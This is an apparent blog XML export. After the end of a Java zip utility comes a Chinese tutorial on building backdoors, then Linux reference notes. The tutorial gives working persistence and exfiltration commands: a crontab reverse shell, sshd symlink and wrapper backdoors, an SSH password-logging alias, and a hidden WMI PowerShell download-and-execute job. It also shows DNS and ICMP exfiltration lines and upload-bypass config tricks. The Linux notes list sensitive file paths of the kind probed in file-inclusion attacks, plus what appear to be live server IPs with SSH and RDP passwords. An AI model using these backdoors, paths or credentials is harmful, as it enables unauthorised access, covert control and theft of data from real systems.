fileHeaderList.size(); i++) &#123; FileHeader fileHeader = (FileHeader)fileHeaderList.get(i); System.out.println("Name: " + fileHeader.getFileName()); System.out.println("Compressed Size: " + fileHeader.getCompressedSize()); System.out.println("Uncompressed Size: " + fileHeader.getUncompressedSize()); System.out.println("CRC: " + fileHeader.getCrc32()); System.out.println("************************************************************"); &#125; return true; &#125; catch (ZipException e) &#123; e.printStackTrace(); return false; &#125; &#125; /** * 解压zip里的所有文件 * @param inPath * @param outPath * @param password * @return */ public static boolean extractZip(String inPath,String outPath ,String password) &#123; try &#123; ZipFile zipFile = new ZipFile(inPath); if (zipFile.isEncrypted()) &#123; zipFile.setPassword(password); &#125; zipFile.extractAll(outPath); System.out.println(password); return true; &#125; catch (ZipException e) &#123;// e.printStackTrace(); return false; &#125; &#125; /** * 解压zip里的文件 * @param inPath * @param storagePath * @param outPath * @param password * @return */ public static boolean extractFileFromZip(String inPath,String storagePath,String outPath ,String password) &#123; try &#123; ZipFile zipFile = new ZipFile(inPath); if (zipFile.isEncrypted()) &#123; zipFile.setPassword(password); &#125; List fileHeaderList = zipFile.getFileHeaders(); storagePath = storagePath.replaceAll("\\\\", "/"); for (int i =0;i&lt;fileHeaderList.size() ;i++) &#123; FileHeader fileHeader = (FileHeader)fileHeaderList.get(i); if(fileHeader.getFileName().indexOf(storagePath)==0)&#123; zipFile.extractFile(fileHeader, outPath); zipFile.removeFile(fileHeader.getFileName()); &#125; &#125; return true; &#125; catch (ZipException e) &#123; e.printStackTrace(); return false; &#125; &#125; /** * 测试zip 压缩算法 */ public static void main(String[] args) &#123; System.out.println("Zip压缩／解压缩测试"); // System.out.println("添加文件夹压缩文件"); // String inPath = "C:\\Users\\dell\\Desktop\\测试文件"; // String outPath = "C:\\Users\\dell\\Desktop\\test.zip";// String storagePath = null;// String password = "123456";// ZipUtil.addFoldInZip(inPath, storagePath,outPath,password); // System.out.println("添加文件到压缩文件"); // String inPath1 = "C:\\Users\\dell\\Desktop\\IEEE_TPDS2003.docx"; // String outPath1 = "C:\\Users\\dell\\Desktop\\test.zip";// String storagePath1 = null;// String password1 = "";// ZipUtil.addFileInZip(inPath1, storagePath1,outPath1,password1); // System.out.println("删除zip的某个文件"); // String storagePath2 = "测试文件\\毕业论文模板201435"; // String inPath2 = "C:\\Users\\dell\\Desktop\\test.zip";// String password2 = "123456";// ZipUtil.removeFileInZip(inPath2, storagePath2, password2); // System.out.println("查看zip文件中的内容"); // String inPath3 = "C:\\Users\\dell\\Desktop\\test.zip"; // String password3 = "123456";// ZipUtil.getNameFromZip(inPath3,password3); // System.out.println("解压压缩文件"); // String inPath4 = "C:\\Users\\dell\\Desktop\\www.zip"; // String outPath4 = "C:\\Users\\dell\\Desktop\\"; // String password4 = "123456";// ZipUtil.extractZip(inPath4, outPath4, password4); // System.out.println("解压zip中的某个文件"); // String inPath5 = "C:\\Users\\dell\\Desktop\\test.zip"; // String outPath5 = "C:\\Users\\dell\\Desktop\\"; // String password5 = "123456";// String storagePath5 = "测试文件\\毕业论文模板201435";// ZipUtil.extractFileFromZip(inPath5, storagePath5, outPath5, password5); System.out.println("已经输出！"); &#125;&#125;]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>zip</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Backdoor 基础]]></title>
    <url>%2F2017%2F01%2F21%2Fbackdoor-base%2F</url>
    <content type="text"><![CDATA[概述 没有最好的后门，只有最合适的后门。 在整体架构上，一个优秀的后门应该充分考虑其功能、触发方式和通信方式等方面。针对不同的方面，杀软也会根据其特征进行处理。为了进一步的持续性控制以及后渗透，后门越显复杂化。从后门的发展史中可看出，这是一场攻与防的持续性较量，简单来说，渗透测试拿下服务器后，怎么能不留后门呢。当然，这是玩笑话。 分类 终端平台：Linux型、Windows型和IOT型； Linux：配置型、logger型和rookit型； Windows：Registry型、Schtasks型和WMI型； 通信方式：http/https型、irc型、dns型、icmp型等。 网站应用：模块扩展型、后端语言型和配置文件型。 终端平台Linux配置型这里的配置型是指借助Linux系统本身的一些特性来完成后门布置功能。 crontab运维经常会用到该命令，这相当于windows的计划任务，规定时间来执行指定命令。这通常与反弹shell一起运用。 1$ (crontab -l;printf "*/5 * * * * exec9&lt;&gt; /dev/tcp/localhost/8080&amp;&amp;exec0&lt;&amp;9&amp;&amp;exec1&gt;&amp;92&gt;&amp;1&amp;&amp;/bin/bash --noprofile –I;\rno crontab for `whoami`%100c\n")|crontab - ssh公钥免密将客户端生成的ssh公钥写到所控服务器的~/.ssh/authorized_keys中，然后客户端利用私钥完成认证即可登录。 123$ ssh-keygen -t rsa$ lsid_rsa id_rsa.pub 把id_rsa.pub写入服务端的authorized_keys中，并修改好相应权限。 12$ chmod 600 ~/.ssh/authorized_keys$ chmod 700 ~/.ssh 这种后门的特点是简单易用，但在实战中会被服务器的配置环境所限制，以及容易被发现。 软连接后门1$ ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555; 经典后门。直接对sshd建立软连接，之后用任意密码登录即可。 1ssh root@x.x.x.x -p 5555 但这隐蔽性很弱，一般的rookit hunter这类的防护脚本可扫描到。 SSH Server wrapper123456789101112$ cd /usr/sbin/$ mv sshd ../bin$ vim sshd#!/usr/bin/perlexec"/bin/sh"if(getpeername(STDIN)=~/^..LF/);exec&#123;"/usr/bin/sshd"&#125;"/usr/sbin/sshd",@ARGV;``` 赋予权限chmod 755 sshd，最后正向连接：``` bashsocat STDIO TCP4:target_ip:22,sourceport=19526 其中，\x00\x00LF是19526的大端形式，便于传输和处理。原理是从sshd fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断。隐蔽性比刚刚介绍的软连接后门要好。 logger型alias这种通过替换命令来使得evil效果最大化的用法，一般是通过追踪ssh的系统调用比如read、write等来记录下ssh的操作。 1alias ssh=&apos;strace -o /tmp/sshpwd-`date &apos;+%d%h%m%s&apos;`.log -e read,write,connect -s2048 ssh&apos; 当然，这只是alias后门的一种用法，可根据具体情况举一反三。 pampam是一种认证机制，它可帮助管理员快速方便地配置认证方式，并且无需更改服务程序。这种后门主要是通过pam_unix_auth.c打补丁的方式潜入到正常的pam模块中，以此来记录管理员的帐号密码。搭建方式见下连接。 openssh后门同理，也是下载对应的恶意补丁包，来记录管理员的帐号密码。但该后门与pam后门存在很大的问题是编译环境，有时在实战中会出现各种各样的问题。搭建方式见下连接。 rookit应用级rootkit应用级rookit的主要特点是通过批量替换系统命令来实现隐藏，如替换ls、ps和netstat等命令来隐藏文件、进程和网络连接等，有时会有守护进程来保证后门的稳定性。推荐两款常用的木马：mafix和brookit。如果想要学习linux类木马，推荐阅读orange的tsh源码，基本上涵盖了常规木马应具有的特点。 内核级rookit隐藏性通常要借助对linux系统调用的截获来达到目的，并且难以查杀，难以清除，危害巨大。由于未找到相应例子，遂不做具体分析。 windowswindows后门博大精深，实在不好分类，因为后门常需持久化潜在运行，受到powersploit中persistence脚本的启发，因此采取使用后门的触发方式进行分类，分为registry型、schtasks型和WMI型。 registry型在一般用户权限下，通常是将要执行的后门程序或脚本路径填写到如下注册表的键值中HKCU:Software\Microsoft\Windows\CurrentVersion\Run，键名任意。普通权限即可运行。 不过这老生长谈的后门早已被用烂，360杀软会弹框提示。 schtasks型该类型后门可分为管理员权限和普通用户权限，管理员权限可以设置更多的计划任务，比如重启后运行等。 1schtasks /Create /SC HOURLY /TN Updater /TR $CommandLine 这里比较大的限制是策略问题，只能按照规定的时间来执行相关程序或命令。通常来讲，持久性的APT对于这点要求较高。 WMI型Defcon23的演讲后，WMI型后门的热度在国外迅速蔓延。（强烈推荐使用该类型后门）它是只能由管理员权限运行的后门，一般是用powershell编写。目前以这一触发方式运行的后门是不会引起杀软任何反映的。具体原理可到drops去了解。 该类型后门主要用到了WMI展现出来的两个特征：无文件和无进程。 将core code加密存储于WMI类的property中，而该位置在复杂的CIM 数据库中，这达到了所谓的无文件；将filter和consumer异步绑定在一起，当规定的filter满足条件时，比如间隔1min，那么系统会自动启动一进程（名称为powershell）去执行consumer（后门程序）中的内容，当执行完成后，进程会消失，持续的时间根据后门运行情况而定，一般是几秒，这达到了所谓的无进程。 上述三类的详情代码请参考powersploit现阶段无论再复杂的WMI后门都是围绕上面两点而展开的，最核心的是后者。 下面是比较典型的代码，功能为每分钟执行下载并执行： 1234567891011121314151617181920212223242526272829$Name = &apos;test&apos;# build the filter$TimeExecTime = 60$Query = &quot;SELECT * FROM __InstanceModificationEvent WITHIN$TimeExecTime WHERE TargetInstance ISA &apos;Win32_PerfFormattedData_PerfOS_System&apos;&quot;$NS = &quot;root\subscription&quot;$FilterArgs = @&#123; Name=$Name EventNameSpace=&quot;root\cimv2&quot; QueryLanguage=&quot;WQL&quot; Query=$Query&#125;$Filter = Set-WmiInstance -Namespace $NS -Class &quot;__EventFilter&quot; -Arguments $FilterArgs# build the consumer$ConsumerName = $Name$command = &quot;`$wc = New-Object System.Net.Webclient; `$wc.Headers.Add(&apos;User-Agent&apos;,&apos;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) Like Gecko&apos;); `$wc.proxy = [System.Net.WebRequest]::DefaultWebProxy; `$wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX (`$wc.DownloadString(&apos;$URL&apos;))&quot;#$encCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))$commandLine = &quot;C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -NoP -NonI -w hidden -Command $command&quot; $ConsumerArgs = @&#123; Name=$ConsumerName CommandLineTemplate=$commandLine&#125;$consumer = Set-WmiInstance -Class &quot;CommandLineEventConsumer&quot; -Namespace $NS -Arguments $ConsumerArgs#Bind filter and consumer$Args = @&#123; Filter = $Filter Consumer = $consumer&#125;Set-WmiInstance -Class &quot;__FilterToConsumerBinding&quot; -Namespace &quot;root\subscription&quot; -Arguments $Args IOT物联网的脆弱性因Mirai恶意软件的肆用而不断凸显，特别是弱口令的泛滥、致使了大批物联网设备沦陷。其中造成的危害不言而喻，不但可以耗用其资源，更可怕的是可能利用设备本身的功能造成意料不到的伤害。如果单单从技术的角度上讲，Mirai确实是一款非常优秀的恶意软件。在这里，我们只讨论它们的后门特性： 进程对于运行时进程的处理，Mirai采用的是进程名随机，也算是为了不被特征提取所采取的一个措施。 http://p9.qhimg.com/t0147848fcfcfd59340.png 防重启因为IOT设备的特殊性，无法将程序写进设备中，只能驻留在内存里，所以需不能使设备重启。在固件里，有一进程会不断向watchdog进程发送一字节数据，如果没有该操作，设备则会重启。Mirai采取的是关闭watchdog的功能。 http://p4.qhimg.com/t01e96433fc3208ba2b.png 通信协议该过程可以分为上线过程：bot发送\x00\x00\x00\x01，得到回应后再发送\x00；心跳过程：bot间隔60s发送\x00\x00cnc，cnc回应\x00\x00；解析执行：cnc对bot发出的指令里采取了一定的格式。[target_num] 02 [IP] 08 08 08 08 [MASK] 20 [IP] 07 07 07 07 [MASK] 20….. IOT设备后门的重点往往是在其功能的实现上，而不是在后门的persistence上，因为IOT设备一旦被突破，几乎入无人之境，恶意软件会合理地最大化利用其中的资源。 通信方式类后门的网络通信行为同样是防火墙的侦查重点，在复杂的实际环境下，怎么把被控端的数据回传成为了一个难点。对于不同的防火墙，其使用的策略也有些不同。 http/https型目前可以说这是最流行的通信方式，可借用第三方的api来实现回连功能，从很大程度上讲解决了很多困难。像在github star比较高的，如twittor、gcat等，从代码上看不会有太大问题，主要是完成了对相应第三方应用的api调用以及功能的实现，但是这种第三方选取并不合理，它会造成溯源十分容易。先不论gmail的实名制，问题的关键在于被控端只能共享一个或几个gmail帐号，当其中一个被控端被追查后，其它的被控端很可能就处于危险状态。 根据经验来看，如果真要借助第三方的网站来完成通信，比较常用的是论坛、网盘等，可以将被控端各自的权限分离开来。在很多APT报告中，我们可看到dropbox及reddit快成为远控木马的重灾区，官方当然也出台了一些措施来制止这种行为。 这部分木马可参考nishang框架中的HTTP-Backdoor脚本。 总的来讲，这种适合于比较小型的，不适合于大型僵尸网络。在国内这种类型的网站基本需要实名制，以官方的力量来追踪是十分容易的。危害小则被封号，大则查水表。 目前对于追踪的问题主流采取的是DGA(Domain Generation Algorithm)，自建服务器。 攻击者和被控段以同样的算法和种子算出一系列域名，种子的约定可以是日期，可以是天气等。攻击者注册其中的一个或多个域名。这样的好处是反汇编难度大，算法不易被破解。即使被破解了，安全人员还需抢在攻击者之前及时注册生成的大量域名，费时费钱费力。 更多详细的可参考《C&amp;C控制服务的设计和侦测方法综述》 irc型irc的木马优点很多，比如管理方便，便于远控协调分工，channel隐藏，追溯难。缺点很明显，国内只有较少的用户使用irc，用户防火墙可能会拦截该流量，具体情况根据地区而定。关于这部分irc木马的中文实例资料可参考 icmp型ICMP通信协议中可看到在最后空余了很大的data段，名为数据缓冲区，可填充60000多字节。因此，可将被控端得到的数据放入其中： 1234$cmd = ls;$timeout = 1000;$server_ip = 'xxxx';(New-Object System.Net.NetworkInformation.Ping).Send($server_ip, $timeout, $cmd) 在server_ip上抓包可看到返回结果。 dns型DNS原理在这不过多展开，这种类型的逃逸方法一般是用自己申请的域名，将NS记录指向搭建的NS服务器上，使用DNS泛解析，把用户所查询关于该域名的信息记录下来。 1$ ping -c 2 `whoami`.xxxx.ceye.io 1$ nslookup -querytype=txt $data.ns.lynahex.com 8.8.8.8 不过使用如上的常规方法，似乎会对data长度有限制。自建NS服务器的源码可看NoEye（题外话：有的厂商从数据库中查询指定域名的txt记录时并未过滤，可能会有sql注入。:-D。） 该类流行的木马可参考dnscat2,它涉及了更底层的包构造，即使没有域名，也可使用该协议进行通信。 具体用法 总的来说，这类后门依赖于上层协议，符合人们常用协议的范围，同时，攻击者也在探寻新兴的协议来exfiltrate。 网站类传统的后门中自然少不了该类型，从用户发出数据请求开始到最终落入网站的数据库中，经过服务端的每一环节都有可能成为攻击者利用的地方。 模块扩展型中间件之所以能被利用，是因为它们的可扩展性，当布置完模块或插件时，中间件无法判断开发者的行为是否为恶意。 apache将后门增加到apache模块目录中，攻击者只需要简单地发起一个请求就可拿到root权限的shell，并且没有任何日志记录。最出名的莫过于mod_rootme 具体操作可参考 ginxnginx占有内存少，并发能力强，受到很多用户的喜爱。它可很方便地添加和升级模块，同理，pwnginx作为经典的后门也是应用了该原理，程序员只需将正常的功能稍微改动，就能达到另一面的效果。 iisiis后门是用了iis本身的机制，当在http头里增加一字段即可触发后门，并执行发过来的命令。具体原理和操作可参考中间件的后门大多是以类似上述原理为基础的。 PHP扩展库同理，将编译好的so文件添加到php.ini的extension中。当模块被初始化时，会去加载执行我们的代码。当发送特定参数的字符串过去时，即可触发后门。 后端语言型这类后门在新型框架和语言的兴起下，影响力有些稍稍减弱。主要原因是现主流框架都采取路由的方式来映射url，有时攻击者即使上传完后门，也有可能无法找到对应的路由映射方式。站在不同人群的角度来看后门也别有一番风情。下面分为开发者后门和攻击者使用的后门，其中针对攻击者的后门是以PHP为例。 开发者后门有时开发者也会在代码中留下后门，比如x博CMS。它通常是一些奇怪的代码，稍微动态调试下可分析出后门，这是属于比较低级的，更高级的的后门是逻辑和理论相关的漏洞，在defcon23上进行的“卑鄙密码竞赛”，曾经wooyun有介绍，有的参赛者将密码学的知识和PHP特性相结合，并以一定的逻辑性代码迷惑大多数人。虽然不难，但能想出这点子实在难能可贵。更为有趣的是，即使被发现了也可当作是个漏洞处理，舆论不会偏向于说这是开发者留下的后门。 另外一方面，后门不一定直接出现在产品中，可能也会存在库中或编译好的文件里，比如nodesjs仓库或pyc后门。 PHP后门随着时代的变迁，木马的重心也随着转移。前10年里，PHP马看重的是功能，而如今则是免杀以及绕waf的能力，具体来说，指的是木马静态文件的免杀和通信流量的无特征。 在实战中，主要采取的方法为混淆编码、字符替换等，还可利用解释性语言的特性以及其回调机制。对于通信流量方面，一般采取对称加密，如DES，而不是编码等。比较成熟的后门是weevely，也可根据需求将菜刀完善，把流量加密。 配置文件型该类型后门主要是通过阅读相关官方文档来挖掘发现，主要应用场景是bypass上传文件的黑名单。以PHP语言为例： .htaccess后门在.htaccess中添加php解析的新后缀并上传，之后上传该后缀的木马即可。 1AddType application/x-httpd-php .abc .user.ini后门.user.ini相当于用户自定义的php.ini。 上传.user.ini，其中的内容为： 1auto_prepend_file=xx.gif 可以让该目录下的所有php文件自动包含xx.gif，我们直接上传xx.gif作为木马。不过较大的限制是该目录下必须要有正常的php文件才能使得xx.gif中的代码执行。 总结当然，上面的这些都是大牛们总结的，我只是个搬运工。]]></content>
      <categories>
        <category>backdoor</category>
      </categories>
      <tags>
        <tag>backdoor</tag>
        <tag>linux</tag>
        <tag>windows</tag>
        <tag>iot</tag>
        <tag>protocol</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 基础知识]]></title>
    <url>%2F2016%2F12%2F22%2Flinux-base%2F</url>
    <content type="text"><![CDATA[概述记录一下Linux的常用命令，方便查询。 持续更新中。 目录基本目录12345678910111213141516171819202122232425262728/var (variable)：与系统运作过程有关。/var/log/ 日志/dev 驱动 比要重要的档案有/dev/null, /dev/zero, /dev/tty, /dev/lp*, /dev/hd*, /dev/sd*等等/usr (软件放置处)/usr/local 系统管理员在本机自行安装自己下载的软件/usr/share/doc 说明文件档/opt (第三方协力软件)/etc (配置文件) /etc/init.d/：所有朋务的预设启动 script 都是放在这里的。 例如要启动或者关闭 iptables 的话：『 /etc/init.d/iptables start』、『/etc/init.d/iptables stop』/boot (开机与核心档) Linux kernel常用的档名为：vmlinuz，如果使用的是grub这个开机管理程序， 则还会存在/boot/grub/这个目录喔！/bin 系统有很多放置执行文件的目录，但/bin比较特殊。 因为/bin放置的是在单人维护模式下还能够被操作的指令。在/bin底下的指令可以被root不一般账号所使用，主要有：cat, chmod, chown, date, mv, mkdir, cp, bash等等常用的指令。/home 这是系统默认的用户家目录(home directory)。/lib 系统的函式库/media 可移除的装置啦！ 包括软盘、光盘、DVD等等装置都暂时挂载在这。/mnt 如果你想要暂时挂载某些额外的装置，一般建议你可以放置到这个目录中。/srv 是一些网络朋务启动后，这些服务所需要取用的数据目录。/tmp 暂时放置档案的地方。/lost+found 这个目录是使用标准的ext2/ext3文件系统格式才会产生的一个目录，目的在二当文件系统发生错误时， 将一些遗失的片段放置到这个目录下。这个目录通常会在分割槽的最顶层存在， 例如你加装一颗硬盘于/disk中，那在这个系统下就会自动产生一个这样的目录『/disk/lost+found』/proc 他放置的数据都是在内存当中， 例如系统核心、行程信息(process)、周边装置的状态及网络状态等等。因为这个目录下的数据都是在内存当中， 所以本身不占任何硬盘空间啊！比较重要的档案例如：/proc/cpuinfo, /proc/dma, /proc/interrupts, /proc/ioports, / proc/net/* 等等。/sys 这个目录其实跟/proc非常类似，也是一个虚拟的文件系统，主要也是记录不核心相关的信息。 包括目前已加载的核心模块不核心侦测到的硬件装置信息等等。这个目录同样不占硬盘容量喔！/sbin 重要的系统执行文件 常见路径Linux 系统下的一些常见路径： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147/etc/passwd/etc/shadow/etc/fstab/etc/host.conf/etc/motd/etc/ld.so.conf/var/www/htdocs/index.php/var/www/conf/httpd.conf/var/www/htdocs/index.html/var/httpd/conf/php.ini/var/httpd/htdocs/index.php/var/httpd/conf/httpd.conf/var/httpd/htdocs/index.html/var/httpd/conf/php.ini/var/www/index.html/var/www/index.php/opt/www/conf/httpd.conf/opt/www/htdocs/index.php/opt/www/htdocs/index.html/usr/local/apache/htdocs/index.html/usr/local/apache/htdocs/index.php/usr/local/apache2/htdocs/index.html/usr/local/apache2/htdocs/index.php/usr/local/httpd2.2/htdocs/index.php/usr/local/httpd2.2/htdocs/index.html/tmp/apache/htdocs/index.html/tmp/apache/htdocs/index.php/etc/httpd/htdocs/index.php/etc/httpd/conf/httpd.conf/etc/httpd/htdocs/index.html/www/php/php.ini/www/php4/php.ini/www/php5/php.ini/www/conf/httpd.conf/www/htdocs/index.php/www/htdocs/index.html/usr/local/httpd/conf/httpd.conf/apache/apache/conf/httpd.conf/apache/apache2/conf/httpd.conf/etc/apache/apache.conf/etc/apache2/apache.conf/etc/apache/httpd.conf/etc/apache2/httpd.conf/etc/apache2/vhosts.d/00_default_vhost.conf/etc/apache2/sites-available/default/etc/phpmyadmin/config.inc.php/etc/mysql/my.cnf/etc/httpd/conf.d/php.conf/etc/httpd/conf.d/httpd.conf/etc/httpd/logs/error_log/etc/httpd/logs/error.log/etc/httpd/logs/access_log/etc/httpd/logs/access.log/home/apache/conf/httpd.conf/home/apache2/conf/httpd.conf/var/log/apache/error_log/var/log/apache/error.log/var/log/apache/access_log/var/log/apache/access.log/var/log/apache2/error_log/var/log/apache2/error.log/var/log/apache2/access_log/var/log/apache2/access.log/var/www/logs/error_log/var/www/logs/error.log/var/www/logs/access_log/var/www/logs/access.log/usr/local/apache/logs/error_log/usr/local/apache/logs/error.log/usr/local/apache/logs/access_log/usr/local/apache/logs/access.log/var/log/error_log/var/log/error.log/var/log/access_log/var/log/access.log/usr/local/apache/logs/access_logaccess_log.old/usr/local/apache/logs/error_logerror_log.old/etc/php.ini/bin/php.ini/etc/init.d/httpd/etc/init.d/mysql/etc/httpd/php.ini/usr/lib/php.ini/usr/lib/php/php.ini/usr/local/etc/php.ini/usr/local/lib/php.ini/usr/local/php/lib/php.ini/usr/local/php4/lib/php.ini/usr/local/php4/php.ini/usr/local/php4/lib/php.ini/usr/local/php5/lib/php.ini/usr/local/php5/etc/php.ini/usr/local/php5/php5.ini/usr/local/apache/conf/php.ini/usr/local/apache/conf/httpd.conf/usr/local/apache2/conf/httpd.conf/usr/local/apache2/conf/php.ini/etc/php4.4/fcgi/php.ini/etc/php4/apache/php.ini/etc/php4/apache2/php.ini/etc/php5/apache/php.ini/etc/php5/apache2/php.ini/etc/php/php.ini/etc/php/php4/php.ini/etc/php/apache/php.ini/etc/php/apache2/php.ini/web/conf/php.ini/usr/local/Zend/etc/php.ini/opt/xampp/etc/php.ini/var/local/www/conf/php.ini/var/local/www/conf/httpd.conf/etc/php/cgi/php.ini/etc/php4/cgi/php.ini/etc/php5/cgi/php.ini/php5/php.ini/php4/php.ini/php/php.ini/PHP/php.ini/apache/php/php.ini/xampp/apache/bin/php.ini/xampp/apache/conf/httpd.conf/NetServer/bin/stable/apache/php.ini/home2/bin/stable/apache/php.ini/home/bin/stable/apache/php.ini/var/log/mysql/mysql-bin.log/var/log/mysql.log/var/log/mysqlderror.log/var/log/mysql/mysql.log/var/log/mysql/mysql-slow.log/var/mysql.log/var/lib/mysql/my.cnf/usr/local/mysql/my.cnf/usr/local/mysql/bin/mysql/etc/mysql/my.cnf/etc/my.cnf/usr/local/cpanel/logs/usr/local/cpanel/logs/stats_log/usr/local/cpanel/logs/access_log/usr/local/cpanel/logs/error_log/usr/local/cpanel/logs/license_log/usr/local/cpanel/logs/login_log/usr/local/cpanel/logs/stats_log/usr/local/share/examples/php4/php.ini/usr/local/share/examples/php/php.ini/usr/local/tomcat5527/bin/version.sh/usr/share/tomcat6/bin/startup.sh/usr/tomcat6/bin/startup.sh 开机流程简单的说，整个开机流程到操作系统之前的动作应该是这样的： BIOS：开机主动执行的韧体，会认识第一个可开机的装置； MBR：第一个可开机装置的第一个扇区内的主要启动记录区块，内吨开机管理程序； 开机管理程序(boot loader)：一支可读叏核心档案来执行的软件； 核心档案：开始操作系统的功能… 文件属性123456789101112drwxr-xr-x 16 root root 4096 Aug 6 22:01 ImageMagick[ 权限 ] [连结] [拥有者] [群组][档案容量] [ 修改日期 ] [ 文件名 ] d rwx r-x r-x[ 文件类型 ] [ 文件拥有者 ] [ 文件所属组 ] [ 其他人权限 ]第一个字符代表这个档案是『目录、档案或链接文件等等』：* 当为[ d ]则是目录，例如上表档名为『.gconf』的那一行；* 当为[ - ]则是档案，例如上表档名为『install.log』那一行；* 若是[ l ]则表示为连结档(link file)；* 若是[ b ]则表示为装置文件里面的可供储存的接口讴备(可随机存取装置)；* 若是[ c ]则表示为装置文件里面的串行端口讴备，例如键盘、鼠标(一次性读取装置)。 权限对目录的重要性可读表示具有读取目录结构列表的权限，所以当你具有读取(r)一个目录的权限时，表示你可以查询该目录下的文件名数据。 所以你就可以利用 ls 这个指令将该目录的内容列表显示出来！ 可写这个可写入的权限对目录来说，是很里不起起的！ 因为他表示你具有移动该目录结构列表的权限，也就是底下这些权限： 建立新的档案与目录； 删除已经存在的档案与目录(不论该档案的权限为何！) 将已存在的档案或目录进行更名； 搬移该目录内的档案、目录位置。总之，目录的w权限就与该目录底下的文件名异动有关就对了啦！ 执行目录只是记录文件名而已，总不能拿来执行吧？没错！目录不可以被执行，目录的x代表的是用户能否迚入该目录成为工作目录的用途！所谓的工作目录(work directory)就是你目前所在的目录啦！举例来说，当你登入Linux时， 你所在的家目录就是你当下的工作目录。而变换目录的命令是『cd』(change directory)啰！ 工作目录对于指令的执行是非常重要的，如果你在某目录下不具有x的权限， 那么你就无法切换到该目录下，也就无法执行该目录下的任何指令，即使你具有该目录的r的权限。 文件名限制在Linux底下，使用预设的Ext2/Ext3文件系统时，针对档案的档名长度限制为： 单一档案或目录的最大容许文件名为 255 个字符； 包函完整路径名称及目录 (/) 的完整档名为 4096 个字符。以及避免一些特殊字符比较好！例如底下这些：1* ? &gt; &lt; ; &amp; ! [ ] | \ &apos; &quot; ` ( ) &#123; &#125; 常用指令基础指令123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960date 显示日期cal 显示日历bc 计算器[Ctrl]-c 中断目前程序[Ctrl]-d 取代exit的输入info 指令说明man 指令说明whatis 指令说明shutdown 关机reboot 重启halt 重启poweroff 重启init 系统运作的模式 init 0 关机chgrp 改变档案所属群组chown 改变档案拥有者chmod 改变档案的权限, SUID, SGID, SBIT等等的特权cd 变换目录pwd 显示弼前目录mkdir 建立一个新的目录rmdir 删除一个空的目录cp (复制档案或目录)rm (移除档案或目录)mv (移动档案与目录，或更名)cat 由第一行开始显示档案内容tac 从最后一行开始显示，可以看出 tac 是 cat 的倒着写！nl 显示的时候，顺道输出行号！more 一页一页的显示档案内容less 不 more 类似，但是比 more 更好的是，他可以往前翻页！head 叧看头几行tail 叧看尾巳几行od 以二迚制的方式读取档案内容！touch 修改档案时间或建置新档umask 档案预设权限chattr (配置文件案隐藏属性) lsattr (显示档案隐藏属性) file 观察文件类型which (寻找『执行档』)whereis (寻找特定档案)locate 这是因为 locate 寻找的数据是由『已建立的数据库 /var/lib/mlocate/』 里面大的数据所搜寻到的，所以不用直接在去硬盘弼中存取数据find 不过由亍 find 在寻找数据得时后相当的操硬盘tar 压 缩：tar -jcv -f filename.tar.bz2 要被压缩的档案或目录名称 查 询：tar -jtv -f filename.tar.bz2 解压缩：tar -jxv -f filename.tar.bz2 -C 欲解压缩的目录type Bash shell 的内建命令grep 搜索指定字符串kill 杀死进程 ps 将某个时间点的程序运作情况撷取下来top 动态观察程序的变化pstree 查到程序相关性free 观察内存使用情况uname 查阅系统与核心相关信息uptime 观察系统启动时间与工作负载netstat 追踪网络或插槽文件vmstat 侦测系统资源变化lsof 列出被程序所开启的档案文件名pidof ：找出某支正在执行的程序的 PID 常用指令系统管理 fdisk fdisk -l 查看系统分区信息 fdisk fdisk /dev/sdb 为一块新的SCSI硬盘进行分区 chown chown root /home 把/home的属主改成root用户 chgrp chgrp root /home 把/home的属组改成root组 useradd 创建一个新的用户 groupadd 组名 创建一个新的组 passwd 用户名 为用户创建密码 passwd -d用户名 删除用户密码也能登陆 passwd -S用户名 查询账号密码 usermod -l 新用户名 老用户名 为用户改名 userdel–r 用户名 删除用户一切 service [servicename] start/stop/restart 系统服务控制操作 /etc/init.d/[servicename] start/stop/restart 系统服务控制操作# xshell上传下载： sudo apt-get instal lrzsz 上传：rz -E 下载：sz# ssh 22： sudo apt-get install openssh-server 开启：sudo /etc/init.d/ssh restart# mysql开启远程连接： mysql -u root -p use mysql GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;%&apos; IDENTIFIED BY &apos;123456&apos; WITH GRANT OPTION; flush privileges;# find 命令： find .|xargs grep -ri &quot;IBM&quot; 查找目录下的所有文件中是否含有某个字符串,并且只打印出文件名 find /opt/ -name &quot;MyCProgram.c&quot; 用文件名查找文件 find /opt/ -iname &quot;MyCProgram.c&quot; 用文件名查找文件，忽略大小写 find /opt/ -maxdepth 3 -iname &quot;passwd&quot; 在opt目录下及其最大三层深度的子目录中查找passwd文件 find /opt/ -maxdepth 3 -iname &quot;SBLF.php&quot; -exec cat &#123;&#125; \ 查找文件并查看 find /opt/ -not -iname &quot;MyCProgram.c&quot; 相反匹配 find /opt/ -perm 755 -type f -exec ls -l &#123;&#125; \; 查找opt目录下755权限的文件并执行ls -l find /opt/ -empty 查找所有的空文件 find /opt/lampp/htdocs/ -newer /opt/lampp/htdocs/Trojan/lqx.php 查找在指定文件时间之后做了修改的文件# 远程链接 1).linux ssh ubuntu@115.159.50.234 密码:8KX3OuQkBhDRvE7 2).windows rdesktop 115.159.100.36 -u Administrator -p 3GCGc7OoRn0kpMY7# 设置软连接 ln -s /usr/local/nginx/logs/access.log nginx_access.log# make编译 make 编译 make install 安装编译好的源码包# apt命令 apt-cache search package 搜索包 apt-cache show package 获取包的相关信息，如说明、大小、版本等 sudo apt-get install package 安装包 sudo apt-get install package - - reinstall 重新安装包 sudo apt-get -f install 修复安装”-f = –fix-missing” sudo apt-get remove package 删除包 sudo apt-get remove package - - purge 删除包，包括删除配置文件等 sudo apt-get update 更新源 sudo apt-get upgrade 更新已安装的包 sudo apt-get 